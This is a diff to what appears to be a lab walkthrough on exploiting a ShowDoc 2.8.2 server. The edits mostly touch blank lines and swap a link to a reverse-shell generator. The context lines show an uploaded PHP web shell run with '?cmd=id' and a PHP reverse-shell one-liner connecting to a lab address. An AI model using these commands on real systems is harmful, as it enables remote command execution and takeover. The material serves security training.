@@ -18,6 +18,7 @@
 
 After the target machine is started, access `http://your-ip:8080` to view the `ShowDoc` homepage.
 
+
 ![ShowDoc Homepage](https://static.nextcyber.cn/attachments/images/course/task/05bf4612360f422091c473237913544e.png)
 
 The target is a `ShowDoc 2.8.2` server.
@@ -101,7 +102,6 @@ http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php
 
 Modify the `url` and access our uploaded remote command execution `php` file:
 
-
 ```
 http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
 ```
@@ -112,8 +112,7 @@ As you can see, the `id` command was executed successfully.
 
 ## Reverse Shell
 
-Use this [tool](https://www.realcoding tech.com/online-handling/php-reverse-shell/) to generate a `php` `reverse shell` command:
-
+Use this [tool](https://www.revshells.com/) to generate a `php` `reverse shell` command:
 
 ```
 php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
